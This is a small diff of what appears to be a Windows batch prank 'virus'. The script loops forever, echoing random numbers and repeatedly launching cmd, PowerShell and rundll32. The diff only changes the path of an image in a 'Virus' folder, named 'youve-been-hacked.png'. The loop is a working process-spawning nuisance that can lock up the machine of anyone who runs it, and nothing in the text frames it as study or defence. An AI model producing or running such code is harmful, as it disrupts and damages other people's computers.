@@ -5,6 +5,6 @@ start cmd
 echo %random%%random%%random%%random%%random%%random%%random%%random%%random%
 start Windows PowerShell
 start rundll32.exe
-C:\Downloads\Virus\Img.jpg
+"Virus\youve-been-hacked.png"
 
 goto top
